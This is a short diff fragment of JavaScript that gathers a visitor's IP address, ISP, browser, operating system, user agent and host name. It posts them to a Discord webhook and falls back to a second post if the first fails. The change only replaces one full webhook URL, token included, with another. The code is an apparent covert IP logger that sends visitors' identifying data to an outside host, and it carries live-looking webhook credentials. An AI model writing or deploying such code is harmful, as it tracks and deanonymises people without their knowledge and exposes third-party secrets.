@@ -21,11 +21,11 @@ fetch("https://api.ipify.org")
     isp = data.org;
     
     const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}\nISP: ${isp}` };
-    fetch("https://discord.com/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+    fetch("https://discord.com/api/webhooks/1199826495632314569/4cf-N-amlzEA1M6FzJoJ-DLj7bc-pYgqElRkC638klwCFwhfbI35LTwgB7DccdhQzjDt", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
       .then(() => console.log("success")) 
       .catch(() => { 
         const body = { content: `Date/Time: ${timestamp}\nIP Address: ${ip}\nBrowser: ${browser}\nOperating System: ${os}\nUser Agent: ${userAgent}\nHost Name: ${hostName}` };
-        fetch("https://discord.com/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
+        fetch("https://discord.com/api/webhooks/1199826495632314569/4cf-N-amlzEA1M6FzJoJ-DLj7bc-pYgqElRkC638klwCFwhfbI35LTwgB7DccdhQzjDt", { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } })
           .then(() => console.log("Success! (fallback)")) 
       }); 
   }); 
